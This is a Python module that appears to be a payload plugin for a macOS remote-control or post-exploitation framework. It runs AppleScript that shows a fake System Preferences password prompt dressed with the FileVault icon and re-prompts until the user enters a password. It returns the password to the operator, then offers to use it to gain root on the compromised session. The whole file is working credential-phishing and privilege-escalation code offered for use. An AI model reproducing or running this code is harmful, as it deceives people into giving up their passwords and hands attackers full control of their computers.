import time

class payload:
    def __init__(self):
        self.name = "prompt"
        self.description = "prompt user to type password"
        self.type = "applescript"
        self.id = 123

    def run(self,session,server,command):
        payload = """
tell application "Finder"
    activate

    set myprompt to "Type your password to allow System Preferences to make changes"
                
    set ans to "Cancel"

    repeat
        try
            set d_returns to display dialog myprompt default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK" with icon path to resource "FileVaultIcon.icns" in bundle "/System/Library/CoreServices/CoreTypes.bundle"
            set ans to button returned of d_returns
            set mypass to text returned of d_returns
            if mypass > "" then exit repeat
        end try
    end repeat
                
    try
        do shell script "echo " & quoted form of mypass
    end try
end tell
"""
        password = server.sendCommand("prompt",payload,self.type,session.conn)
        #display response
        print server.h.COLOR_INFO+"[*]  "+server.h.WHITE+"Response: "+server.h.GREEN+password+server.h.WHITE
        #prompt for root
        tryroot = raw_input(server.h.strinfoGet("Would you like to try for root? (Y/n) "))
        if not tryroot:
            tryroot = "y"
        if tryroot.lower() != "y":
            return ""
        #TODO: I am so lazy, probably should use the su command
        password = password.replace("\\","\\\\")
        password = password.replace("'","\\'")
        result = server.sendCommand("eggsu",password,"eggsu",session.conn)
        if "root" in result:
            server.h.strinfo("Root Granted")
            time.sleep(0.2)
            server.h.strinfo("Escalating Privileges")
            server.refreshSession(session)
        else:
            print "failed getting root"
        return ""

